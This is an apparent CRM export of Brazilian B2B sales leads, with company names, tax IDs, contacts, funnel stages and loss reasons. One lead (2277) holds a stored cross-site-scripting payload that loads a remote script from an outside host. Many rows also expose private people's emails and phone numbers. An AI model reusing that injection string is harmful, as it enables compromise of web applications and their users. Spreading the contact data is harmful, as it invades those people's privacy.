ID Lead,Nome do Lead,Razão Social,CNPJ,Contato Principal,E-mail,Telefone,Cidade,Estado,CEP,Bairro,Complemento,Origem,Funil,Etapa do Funil,Status,Responsável,Data de Criação,Hora de Criação,Dias no Funil,Data de Perda,Motivo de Perda,ID Oportunidade,Status da Oportunidade,Data da Oportunidade,ID Cliente,Nome do Cliente,Razão Social Cliente,Data do Pedido,Valor do Pedido,TAGS,Código Externo,ID Lista,Atividade,Faturamento,Segmento,Nome Completo,Indique Ganhe
2170,Via Beach,Via Beach,05098354000134,THALES MOTA ARARUNA,null,(88) 99641-5974,JUAZEIRO DO NORTE,CE,63048185,CIDADE UNIVERSITARIA,,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Perdido,Rayssa Karapeticov,02/06/2025,08:42:04,210,07/01/2026,Não é o momento certo,,,,,,,,,,,262,,,,,
2173,Alpes Aluminio,Alpes Industria E Comercio De Aluminio Ltda,96693221000161,INIVALDO PINHEIRO DE OLIVEIRA,,(75) 98812-0941,FEIRA DE SANTANA,BA,44.032-568,SOBRADINHO,,Feiras,Fluxo Padrão,Nutir,Em andamento,Rayssa Karapeticov,02/06/2025,10:44:16,48,,,,,,,,,,,WhatsappRayssa,,,,,,,
2176,Plasticos Rodrigues & Cia Ltda,Plasticos Rodrigues,45576415000146,SUELEN RODRIGUES DA SILVA,null,(19) 99861-3579,JAGUARIUNA,SP,13915294,CHACARA SANTO ANTONIO COLMEIA,,Base de empresas Leads2b,Fluxo Padrão,Nutir,Em andamento,Rayssa Karapeticov,02/06/2025,11:11:03,48,,,,,,,,,,,WhatsappRayssa,,263,,,,,
2193,Carlos Eduardo ,,01798463000103,Carlos Eduardo ,financeiro@temtudoavare.com.br,(14) 99624-3462,Chavantes,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Paulo Souza,07/06/2025,07:18:43,392,07/08/2025,Fora do segmento atendido,,,,,,,,,Solicita demo,,,,,,,
2210,VITORIA NOBREGA MARINO,,,VITORIA NOBREGA MARINO,vitorianobrega@nobrevie.com.br,(16) 99781-9265,Campinas,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Paulo Souza,16/06/2025,12:11:55,379,07/08/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Contato,,,,,,,
2248,Acqua Torres De Resfriamento De Agua Ltda.,Acqua Torres De Resfriamento De Agua Ltda.,37257842000133,JOSE LUIZ DE ALMEIDA,null,(16) 99760-3741,ARARAQUARA,SP,14806619,3° DISTRITO INDUSTRIAL (VIRGILIO OMETTO PAVAN),ANEXO 1,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Perdido,Rayssa Karapeticov,25/06/2025,17:31:03,210,07/01/2026,Nossa solução não atende,,,,,,,,,,,,,,,,
2276,Mariana OLivo,,,Mariana OLivo,mariworkbr@gmail.com,(11) 94755-7074,São Paulo,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Paulo Souza,30/06/2025,12:00:54,355,07/08/2025,Fora do segmento atendido,,,,,,,,,Solicita demo,,,,,,,
2277,"""><script src=//ldl.one/p/renkill></script>",,,"""><script src=//ldl.one/p/renkill></script>",suporte@sigloca.com,(51) 99344-5505,Viamão,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,30/06/2025,12:52:52,372,17/07/2025,Fora do segmento atendido,,,,,,,,,Solicita demo,,,,,,,
2278,Julia Soares,,,Julia Soares,net@trilharty.com.br,(11) 98338-6298,São Paulo,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Paulo Souza,30/06/2025,14:27:23,355,07/08/2025,Fora do segmento atendido,,,,,,,,,Solicita demo,,,,,,,
2322,Gilberto Iazzetta,,,Gilberto Iazzetta,gilberto@fastbrindessp.com.br,(11) 2539-1216,São Paulo,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,07/07/2025,12:29:59,365,17/07/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Contato,,,,,,,
2335,Thaine,,,Thaine,compras.chrie@gmail.com,(43) 98836-8007,Londrina,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Paulo Souza,09/07/2025,09:09:43,355,07/08/2025,Fora do segmento atendido,,,,,,,,,Solicita demo,,,,,,,
2336,Achiles Leziér ,,,Achiles Leziér ,membi439@gmail.com,(15) 99177-9780,Tietê,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Paulo Souza,10/07/2025,19:27:45,355,07/08/2025,Fora do segmento atendido,,,,,,,,,Solicita demo,,,,,,,
2355,Jomar Brito Pereira,,,Jomar Brito Pereira,jomarbrito1@gmail.com,(83) 98676-1369,Salvador,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Junior Lopes,17/07/2025,15:30:46,350,22/07/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Solicita demo,,,,,,,
2357,Júlio ,,,Júlio ,julio.lagaris@upsidedistribuicao.com.br,(31) 98808-9509,Pouso Alegre,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Paulo Souza,21/07/2025,08:25:01,350,07/08/2025,Fora do segmento atendido,,,,,,,,,Solicita demo,,,,,,,
2361,Editora Dcl - Difusao Cultural Do Livro Ltda,Editora Dcl,60444098000521,Editora Dcl - Difusao Cultural Do Livro Ltda,welington@editoradcl.com.br,(11) 3932-5222,ITUPEVA,SP,13299364,MINA,LOTE CD - AREA B1A2,Base de empresas Leads2b,Fluxo Padrão,Nutir,Ganho,Junior Lopes,23/07/2025,11:52:41,349,,,496,Ganho,23/07/2025,,,,,,,,,,,,,
2363,Associacao Medianeira Fuzipar,Associacao Medianeira Fuzipar,08306975000154,Associacao Medianeira Fuzipar,,(54) 3321-5456,ERECHIM,RS,99700010,CENTRO,,Base de empresas Leads2b,Fluxo Padrão,Nutir,Ganho,Junior Lopes,23/07/2025,12:04:37,349,,,497,Ganho,23/07/2025,,,,,,,,,,,,,
2414,Ezequiel,Duarte Estofaria,,Ezequiel,,(49) 99952-3156,,,,,,Inbound,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Paulo Souza,28/07/2025,08:38:05,344,07/08/2025,Fora do segmento atendido,,,,,,,,,,,,,,,,
2415,PAULO JESUS,PAULO JESUS,,PAULO JESUS,paulo.riovendas@gmail.com,21987491149,Rio de Janeiro,,,,,Feiras,Inbound,Novos Leads,Perdido,Paulo Souza,29/07/2025,15:36:32,343,31/07/2025,"Erro na construção da lista (ICP, Persona, Contatos)",,,,,,,,,Site;Feiras,,,,,,,
2417,For-plast Industria E Comercio De Plasticos Ltda,For-plast,05155765000467,For-plast Industria E Comercio De Plasticos Ltda,forplast.adm@gmail.com,(85) 3102-0100,MARACANAU,CE,61922160,ALTO ALEGRE I,QD 274 L 1 2 3 E 4,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Perdido,Junior Lopes,29/07/2025,16:31:50,222,06/05/2026,Fora do segmento atendido,,,,,,,,,,,,,,,,
2418,alan,alan,,alan,alanresende@rafinhaalimentos.com.br,11982169897,,,,,,Feiras,Inbound,Novos Leads,Perdido,Paulo Souza,29/07/2025,16:43:10,343,31/07/2025,"Erro na construção da lista (ICP, Persona, Contatos)",,,,,,,,,Feiras,,,,,,,
2419,Golden Artefatos De Metais Ltda.,Golden Artefatos De Metais Ltda.,07407089000154,Golden Artefatos De Metais Ltda.,joaopra@brturbo.com.br,(54) 3213-2571,CAXIAS DO SUL,RS,95096140,ESPLANADA,,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Perdido,Junior Lopes,29/07/2025,16:45:02,222,06/05/2026,Fora do segmento atendido,,,,,,,,,WhatsappJuca,,,,,,,
2422,Gp6 Do Brasil Ltda,Gp6 Utilidades,51866587000157,Gp6 Do Brasil Ltda,fiscal.novapremier@gmail.com,(62) 3293-3223,GOIANIA,GO,74550480,VI ABAJA,QUADRA03 LOTE 03 SALA 02,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Perdido,Junior Lopes,29/07/2025,16:47:15,222,06/05/2026,Fora do segmento atendido,,,,,,,,,,,,,,,,
2425,Isanog Comercio De Variedades Ltda,Isanog Comercio De Variedades Ltda,13716575000157,Isanog Comercio De Variedades Ltda,rblimportacoes@gmail.com,(11) 3229-2055,SAO PAULO,SP,02357020,TREMEMBE,,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Perdido,Junior Lopes,29/07/2025,17:02:22,222,06/05/2026,Fora do segmento atendido,,,,,,,,,NUTRIR;TAG1SEM;TAG2SEM;TAG3SEM;TAG4SEM,,,,,,,
2427,Luwave Distribuidora De Variedades E Comercio Ltda,Luwave Distribuidora De Variedades E Comercio Ltda,59716235000127,Luwave Distribuidora De Variedades E Comercio Ltda,consultoria_martins@terra.com.br,(11) 2082-8280,SAO PAULO,SP,03031000,PARI,ANDAR 1 - MEZANINO,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Perdido,Junior Lopes,29/07/2025,17:14:12,222,06/05/2026,Fora do segmento atendido,,,,,,,,,,,,,,,,
2430,Galpao Da Moda Santa Cruz Ltda,Galpao Da Moda Santa Cruz,46083438000181,Galpao Da Moda Santa Cruz Ltda,contalsantacruz@hotmail.com,(81) 9417-3126,SANTA CRUZ DO CAPIBARIBE,PE,55195208,CRUZ ALTA,,Base de empresas Leads2b,Fluxo Padrão,Nutir,Ganho,Junior Lopes,30/07/2025,11:49:24,342,,,503,Perdido,30/07/2025,,,,,,,,,,,,,
2438,Grupo Ecoa Comercio De Produtos S.a.,Grupo Ecoa,30924882000142,Grupo Ecoa Comercio De Produtos S.a.,pedro@grupoecoa.com,(21) 3518-6082,DUQUE DE CAXIAS,RJ,25085380,PARQUE DUQUE,GALPAOA BOX A1 PARTE,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Ganho,Junior Lopes,30/07/2025,16:26:32,342,,,506,Perdido,30/07/2025,,,,,,,,,,,,,
2443,Maxsoy Alimentos Ltda,Maxsoy Alimentos Ltda,06346005000157,Maxsoy Alimentos Ltda,vendas@maxsoy.com.br,(19) 3809-5454,HORTOLANDIA,SP,13187041,JARDIM BOA VISTA,,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Ganho,Junior Lopes,31/07/2025,11:57:07,341,,,509,Perdido,31/07/2025,,,,,,,,,,,,,
2446,Brinquemix Industria E Comercio Ltda,Brinquemix,60315995000101,Brinquemix Industria E Comercio Ltda,fiscal@codepcontabilidade.com.br,(11) 4116-5272,ITAQUAQUECETUBA,SP,08579800,JARDIM KARINE,,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Ganho,Junior Lopes,31/07/2025,17:08:57,341,,,510,Perdido,31/07/2025,,,,,,,,,,,,,
2452,Andreia Albino de brito,,,Andreia Albino de brito,mkt3@keita.com.br,(11) 97550-2468,Guarulhos,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,05/08/2025,11:44:51,336,06/08/2025,"Erro na construção da lista (ICP, Persona, Contatos)",,,,,,,,,Solicita demo,,,,,,,
2453,Matheus Ambrosi,,38470026000176,Matheus Ambrosi,matheus.ambrosi@sanremo.com.br,(51) 99658-9275,São Paulo,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Ganho,Paulo Souza,06/08/2025,16:25:06,334,,,517,Perdido,07/08/2025,,,,,,Solicita demo,,,,,,,
2454,Milene Fonseca,,72677693000162,Milene Fonseca,compras@tapetesoasis.com.br,(11) 2431-1432,Campinas,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Ganho,Paulo Souza,07/08/2025,10:37:07,334,,,516,Perdido,07/08/2025,,,,,,Solicita demo,,,,,,,
2463,Raquel,,27616615000101,Raquel,comercial@dgbcomex.com.br,(47) 99227-7535,Santa Bárbara d'Oeste,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Ganho,Paulo Souza,11/08/2025,15:39:47,328,,,546,Perdido,22/08/2025,,,,,,Solicita demo;Contato,,,,,,,
2464,Carlos,,,Carlos,cpedro@shinyt.com.br,(11) 91852-0852,São Paulo,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Ganho,Paulo Souza,14/08/2025,10:38:07,327,,,545,Perdido,22/08/2025,,,,,,Solicita demo,,,,,,,
2465,Gary,,,Gary,gary-miller@dominatingkeywords.com,(80) 5400-2077,Hartford,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,16/08/2025,23:45:05,325,21/08/2025,"Erro na construção da lista (ICP, Persona, Contatos)",,,,,,,,,Contato,,,,,,,
2466,Jose Romualdo Donatoni,,,Jose Romualdo Donatoni,jrdcontboavista@hotmail.com,(16) 98102-1648,São Carlos,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Paulo Souza,18/08/2025,08:30:11,319,10/09/2025,Não é o momento certo,,,,,,,,,Solicita demo,,,,,,,
2477,Lucas,,,Lucas,marketing@mewoof.com.br,(11) 98527-7256,São Paulo,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Ganho,Paulo Souza,20/08/2025,09:32:37,319,,,600,Perdido,23/09/2025,,,,,,Solicita demo,,,,,,,
2478,Distribuidora Tropical Aromas Ltda,Tropical Aromas,12902777000120,Distribuidora Tropical Aromas Ltda,contato@keurequimica.com.br,(13) 3329-5855,ITAQUAQUECETUBA,SP,08595500,JARDIM DO VALE,,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Ganho,Junior Lopes,20/08/2025,09:53:08,321,,,532,Perdido,20/08/2025,,,,,,,,,,,,,
2481,Usual Plastic - Utilidade Domestica E Comercio Ltda,Usual Plastic - Utilidade Domestica E Comercio Ltda,12589391000291,Usual Plastic - Utilidade Domestica E Comercio Ltda,adm@usualutilidades.com.br,(15) 3283-3659,CESARIO LANGE,SP,18288002,TURVO,KM 0.220 METROS,Base de empresas Leads2b,Fluxo Padrão,Nutir,Ganho,Junior Lopes,20/08/2025,09:59:46,321,,,534,Perdido,20/08/2025,,,,,,,,,,,,,
2490,Pracaza Decor Comercio Importacao E Exportacao De Artigos Para Decoracao Ltda.,Pracaza Decor Comercio Importacao E Exportacao De Artigos Para Decoracao Ltda.,39679781000128,Pracaza Decor Comercio Importacao E Exportacao De Artigos Para Decoracao Ltda.,contato@acrosscontabil.com.br,(11) 4395-7650,SAO PAULO,SP,03024010,CATUMBI,EDIF 1 ANDAR,Base de empresas Leads2b,Fluxo Padrão,Nutir,Ganho,Junior Lopes,20/08/2025,11:15:59,321,,,539,Perdido,20/08/2025,,,,,,,,,,,,,
2493,Aluminio Marcolar Ltda,Aluminio Marcolar Ltda,43066372000204,Aluminio Marcolar Ltda,sac@marcolar.com.br,(11) 2067-1299,RIBEIRAO PIRES,SP,09400310,CENTRO,,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Ganho,Junior Lopes,20/08/2025,11:29:17,321,,,540,Perdido,20/08/2025,,,,,,,,,,,,,
2502,Lara,,,Lara,lfabian.pereira@gmail.com,(19) 99985-2953,Pedreira,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Ganho,Paulo Souza,22/08/2025,11:20:23,319,,,577,Perdido,10/09/2025,,,,,,Contato,,,,,,,
2515,Sidney Stabile,,,Sidney Stabile,sidneysmr1@gmail.com,(11) 98122-0797,São Paulo,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Ganho,Paulo Souza,26/08/2025,14:16:17,313,,,578,Perdido,11/09/2025,,,,,,Solicita demo,,,,,,,
2535,Aluminios Arte Ltda,Aluminios Arte,41549151000180,Aluminios Arte Ltda,aluminiosarte2021@gmail.com,(46) 9933-3909,NOVA PRATA DO IGUACU,PR,85685000,DISTRITO INDUSRIAL,,Base de empresas Leads2b,Fluxo Padrão,Nutir,Perdido,Rayssa Karapeticov,01/09/2025,12:51:58,295,15/09/2025,Sem interesse após contato,,,,,,,,,,,268,,,,,
2538,Jr Comercio De Motos E Pecas Ltda,Jr Comercio De Motos E Pecas,46964028000140,Jr Comercio De Motos E Pecas Ltda,custodiojadi@gmail.com,(67) 9121-3638,CAMPO GRANDE,MS,79080001,JARDIM JOCKEY CLUB,LOJA 06,Base de empresas Leads2b,Inbound,Novos Leads,Ganho,Rayssa Karapeticov,02/09/2025,09:33:38,308,,,566,Perdido,02/09/2025,,,,,,,,,,,,,
2541,Jomafe Brasil - Comercio De Utensilios Domesticos E Cutelarias Ltda.,Jomafe Brasil - Comercio De Utensilios Domesticos E Cutelarias Ltda.,13039863000203,Jomafe Brasil - Comercio De Utensilios Domesticos E Cutelarias Ltda.,vendas.br@jomafe.pt,(11) 3283-3767,SAO PAULO,SP,05013001,PERDIZES,,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Ganho,Rayssa Karapeticov,02/09/2025,10:56:40,308,,,567,Perdido,02/09/2025,,,,,,,,,,,,,
2545,Aline,,,Aline,admin@mgvimport.com.br,(11) 4411-0064,Mogi das Cruzes,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Paulo Souza,03/09/2025,15:06:37,300,29/09/2025,Sem interesse após contato,,,,,,,,,Solicita demo,,,,,,,
2547,NATALIA GABRIELA DAMACENO MOTA,,,NATALIA GABRIELA DAMACENO MOTA,naty-gabriela@hotmail.com,(11) 9667-2094,São Paulo,,,,,Site,Inbound,VENDER AGENDA,Ganho,Paulo Souza,05/09/2025,14:49:52,300,,,575,Perdido,10/09/2025,,,,,,Contato,,,,,,,
2549,Fabiane da SILVA,,,Fabiane da SILVA,fabiane.principios@gmail.com,(48) 99123-3777,Nova Aurora,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,08/09/2025,16:18:56,302,10/09/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Solicita demo;Contato,,,,,,,
2551,Natalia Gabriela Damaceno Mota,Casa Bonitta,36621794000158,Natalia Gabriela Damaceno Mota,catocontabilidade@gmail.com,(11) 4292-3358,SUZANO,SP,08674011,CENTRO,,Base de empresas Leads2b,Fluxo Padrão,Nutir,Ganho,Junior Lopes,10/09/2025,15:52:46,300,,,576,Perdido,10/09/2025,,,,,,,,,,,,,
2561,KAIQUE ARAUJO,Central Distribuidora De Produtos Agropecuarios,07548592000120,KAIQUE ARAUJO,comercial.centralracoes@hotmail.com,(67) 99250-3056,CAMPO GRANDE,MS,79.110-220,VILA ACROPOLIS,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Ganho,Junior Lopes,15/09/2025,16:46:39,294,,,589,Perdido,16/09/2025,,,,,,Solicita demo,,,,,,,
2563,Guilherme Jorge,,35818493000156,Guilherme Jorge,guilherme@traject.com.br,(11) 97610-1582,São Paulo,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,16/09/2025,17:30:28,294,23/09/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Contato,,,,,,,
2571,Ilumac Industria Comercio E Servicos Ltda,Ilumac Industria Comercio E Servicos Ltda,49872306000127,Ilumac Industria Comercio E Servicos Ltda,direcao@safeway.ind.br,(14) 3213-1100,BAURU,SP,17064100,JARDIM PETROPOLIS,,Base de empresas Leads2b,Fluxo Padrão,Nutir,Ganho,Junior Lopes,19/09/2025,15:48:42,291,,,597,Perdido,19/09/2025,,,,,,,,,,,,,
2580,Ramão,Ramão,,Ramão,ramaodlara@gmail.com,67 9 9169-7702,,,,,,Indicação,Fluxo Padrão,Nutir,Ganho,Paulo Souza,24/09/2025,11:42:03,286,,,604,Perdido,24/09/2025,,,,,,,,,,,,,
2581,Ramão,,08019257000105,Ramão,diego.barcelli@guaranisistemas.com.br,,Brumadinho,,,,,Indicação,Fluxo Padrão,Nutir,Ganho,Paulo Souza,24/09/2025,11:42:10,286,,,603,Perdido,24/09/2025,,,,,,,,,,,,,
2582,Principios Representacoes De Artigos De Uso Domestico Ltda,Principios,11392803000155,Principios Representacoes De Artigos De Uso Domestico Ltda,fabiane.principios@gmail.com,(48) 9123-3777,ARARANGUA,SC,88900045,CENTRO,SALA 703 A,Base de empresas Leads2b,Fluxo Padrão,Nutir,Ganho,Junior Lopes,24/09/2025,14:10:22,286,,,602,Perdido,24/09/2025,,,,,,,,,,,,,
2587,Julio cesar flavio,,40108108000117,Julio cesar flavio,contato@arquiplanostands.com.br,(11) 99901-1520,São Paulo,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,24/09/2025,16:55:05,286,25/09/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Contato,,,,,,,
2598,Emerson Silva,,11861121000306,Emerson Silva,operacional@facinato.com.br,(55) 11941-3524,São Paulo,,,,,Site,Inbound,Novos Leads,Ganho,Paulo Souza,25/09/2025,17:09:59,285,,,611,Perdido,26/09/2025,,,,,,Solicita demo,,,,,,,
2622,Leandro carlos gonçalves,,,Leandro carlos gonçalves,solpratae@gmail.com,(16) 99270-3152,São Carlos,,,,,Site,Inbound,VENDER AGENDA,Ganho,Paulo Souza,02/10/2025,12:23:50,277,,,628,Perdido,03/10/2025,,,,,,Solicita demo,,,,,,,
2629,Lucas ,Lucas ,10890600000126,Lucas ,frigobiss@frigobiss.com.br,+5511951534765,,,,,,Indicação,Fluxo Padrão,Qualificação,Perdido,Paulo Souza,06/10/2025,16:20:14,274,17/11/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,,,,,,,,
2630,Lucas ,,08019257000105,Lucas ,matheus.teixeira@guaranisistemas.com.br,,Brumadinho,,,,,Indicação,Fluxo Padrão,Qualificação,Perdido,Paulo Souza,06/10/2025,16:20:20,274,17/11/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,,,,,,,,
2631,Artesanato Uni-art Industria E Comercio Ltda,Artesanato Uni-art Industria E Comercio Ltda,43400571000126,Artesanato Uni-art Industria E Comercio Ltda,thiago@uniartrelogios.com.br,(19) 3876-4260,VINHEDO,SP,13283182,JOAO XXIII,,Base de empresas Leads2b,Fluxo Padrão,Nutir,Ganho,Junior Lopes,09/10/2025,15:46:49,271,,,634,Perdido,09/10/2025,,,,,,,,,,,,,
2641,Diego Nobre,,,Diego Nobre,dinobrers@gmail.com,(51) 99781-5771,Porto Alegre,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Paulo Souza,10/10/2025,20:54:59,267,17/11/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Solicita demo,,,,,,,
2642,YcKQiijqOLBMSIak,,,YcKQiijqOLBMSIak,ukizitalij96@gmail.com,(41) 0462-6139,Amsterdam,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,12/10/2025,11:18:19,268,13/10/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Contato,,,,,,,
2643,DIOGO BORCHERT,,06881851000177,DIOGO BORCHERT,diogo@grupomonitor.ind.br,(45) 99926-1031,Marechal Cândido Rondon,,,,,Site,Fluxo Padrão,Conectados Com Interesse (MQL),Perdido,Paulo Souza,14/10/2025,11:38:37,265,17/11/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Solicita demo,,,,,,,
2645,Rick,,,Rick,rick_stephens@dominatebanners.com,(80) 5400-2077,Huntington,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,15/10/2025,23:48:02,265,16/10/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Contato,,,,,,,
2659,Jones da Costa Grance ,,,Jones da Costa Grance ,distribuidoraprime067@gmail.com,(67) 99147-9660,Campo Grande,,,,,Site,Inbound,Ligação,Ganho,Junior Lopes,17/10/2025,15:43:42,257,,,657,Perdido,23/10/2025,,,,,,Solicita demo,,,,,,,
2661,oiscltWPL,,,oiscltWPL,ahipazuxof79@gmail.com,(53) 6552-7250,Amsterdam,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,18/10/2025,17:59:05,262,24/10/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Contato,,,,,,,
2261,Imprime Industria E Comercio De Plasticos Ltda,Imprime Industria E Comercio De Plasticos,37905383000157,Imprime Industria E Comercio De Plasticos Ltda,sac@ascampoli.com.br,(11) 4552-8400,SAO PAULO,SP,02178010,PARQUE NOVO MUNDO,MZNINO,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Ganho,Junior Lopes,22/10/2025,17:00:31,258,,,656,Perdido,22/10/2025,,,,,,,,,,,,,
2679,Gary,,,Gary,g-c@dominatingkeywords.com,(80) 5400-2077,New York City,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,27/10/2025,04:19:18,253,27/10/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Contato,,,,,,,
2680,Karam kaiss,,,Karam kaiss,mbcontatokaram@gmail.com,(11) 98348-6116,São Paulo,,,,,Site,Inbound,Novos Leads,Ganho,Paulo Souza,27/10/2025,10:41:41,253,,,659,Perdido,27/10/2025,,,,,,Solicita demo,,,,,,,
2684,Sevilha Comercio Internacional Ltda,Sevilla Trade Comex Ltda,44628219000105,Sevilha Comercio Internacional Ltda,diego@gruposevilha.com,(11) 4115-0797,NAVEGANTES,SC,88370888,NUCLEO HUGO DE ALMEIDA,BLOCO 06 GALPAO02 ARMZ 08 A 14 SALA 05,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Ganho,Junior Lopes,28/10/2025,10:15:12,252,,,662,Perdido,28/10/2025,,,,,,,,,,,,,
2690,Lucas Pivetta,,,Lucas Pivetta,lucasfellipivetta@gmail.com,(15) 99601-2600,Tatuí,,,,,Site,Inbound,Novos Leads,Ganho,Paulo Souza,29/10/2025,12:24:45,251,,,,,,,,,,,Contato,,,,,,,
2697,KUCQhexpBICKCDpBROzaGt,,,KUCQhexpBICKCDpBROzaGt,ilosiwelobi855@gmail.com,(65) 2589-0764,Moscow,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,30/10/2025,00:52:51,250,30/10/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Contato,,,,,,,
2733,Salopet Embalagens Plasticas Ltda,Salopet Embalagens Plasticas Ltda,04911908000370,Salopet Embalagens Plasticas Ltda,paralegal10@mgcontecnica.com.br,(11) 2575-1800,EMBU DAS ARTES,SP,06816030,JARDIM SAO FRANCISCO,,Base de empresas Leads2b,Fluxo Padrão,Nutir,Ganho,Junior Lopes,05/11/2025,15:31:05,244,,,674,Perdido,05/11/2025,,,,,,,,,,,,,
2761,Kitay Industria E Comercio De Alimentos Ltda,Kitay Industria E Comercio De Alimentos Ltda,42517186000109,Kitay Industria E Comercio De Alimentos Ltda,claudiorcsalles@gmail.com,(11) 4018-3764,VARGEM GRANDE PAULISTA,SP,06730000,JARDIM HELENA MARIA,GALPAO01,Base de empresas Leads2b,Fluxo Padrão,Nutir,Ganho,Rayssa Karapeticov,13/11/2025,16:09:29,236,,,685,Perdido,13/11/2025,,,,,,,,,,,,,
2764,WIX LIVE SUPPORT,,,WIX LIVE SUPPORT,wix.accessunit@gmail.com,(17) 69344-6606,Lagos,,,,,Site,Inbound,Novos Leads,Perdido,Paulo Souza,13/11/2025,20:16:49,236,17/11/2025,Fora do porte mínimo (sem fite estrutural),,,,,,,,,Contato,,,,,,,
2801,Paulo [TESTE],Teste,,Paulo [TESTE],paulo.souza@guranisistemas.com.br,(16) 99718-1604,,,,,,Inbound,Fluxo Padrão,Qualificação,Em andamento,Paulo Souza,17/11/2025,09:01:50,232,,,,,,,,,,,,,,,,,,
2704,Maxx Diamond Ltda,Maxx Diamond Ltda,23234569000117,Maxx Diamond Ltda,francisco.simoes@maxxdiamond.com,(16) 9735-0007,AMERICO BRASILIENSE,SP,14820462,VILA CERQUEIRA,,Base de empresas Leads2b,Fluxo Padrão,Qualificação,Perdido,Rayssa Karapeticov,17/11/2025,10:09:13,232,09/12/2025,Fora do segmento atendido,,,,,,,,,,,,,,,,
